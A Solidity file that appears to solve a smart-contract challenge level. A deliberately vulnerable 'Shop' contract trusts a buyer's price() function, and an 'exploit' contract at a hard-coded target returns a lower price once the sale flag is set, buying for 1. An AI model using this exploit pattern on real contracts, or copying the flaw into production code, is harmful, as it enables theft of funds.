// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract exploit {
    Shop target = Shop(0x75203AF406ccc87828662C6727a03FfC023F2344);

    function attack() public {
        target.buy();
    }

    function price() external returns (uint256) {
        if (target.isSold())
            return 1;
        return 100;
    }
}